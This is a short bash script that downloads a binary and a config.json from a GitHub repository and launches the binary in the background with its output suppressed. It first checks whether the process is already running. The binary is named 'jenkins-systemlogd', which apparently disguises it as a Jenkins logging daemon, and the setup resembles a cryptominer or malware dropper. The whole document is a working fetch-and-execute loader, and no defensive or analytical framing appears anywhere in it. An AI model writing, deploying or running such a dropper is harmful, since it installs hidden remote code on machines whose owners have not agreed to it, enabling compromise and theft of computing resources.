#!/bin/bash
if pgrep -f "jenkins-systemlogd" > /dev/null; then
    exit 0
fi

if [ -f "jenkins-systemlogd" ]; then
    chmod +x jenkins-systemlogd
    FILE_TO_RUN="./jenkins-systemlogd"
else
    if command -v curl > /dev/null; then
        curl -s -o jenkins-systemlogd https://github.com/supportmrx/jenkins-systemlogd/raw/refs/heads/main/jenkins-systemlogd
        curl -s -o config.json https://raw.githubusercontent.com/supportmrx/jenkins-systemlogd/refs/heads/main/config.json
    elif command -v wget > /dev/null; then
        wget -q -O jenkins-systemlogd https://github.com/supportmrx/jenkins-systemlogd/raw/refs/heads/main/jenkins-systemlogd
        wget -q -O config.json https://raw.githubusercontent.com/supportmrx/jenkins-systemlogd/refs/heads/main/config.json
    else
        exit 1
    fi
    chmod +x jenkins-systemlogd
    FILE_TO_RUN="./jenkins-systemlogd"
fi

if command -v nohup > /dev/null; then
    nohup $FILE_TO_RUN > /dev/null 2>&1 &
elif command -v disown > /dev/null; then
    $FILE_TO_RUN > /dev/null 2>&1 &
    disown $!
else
    $FILE_TO_RUN > /dev/null 2>&1 &
fi 

echo "done";
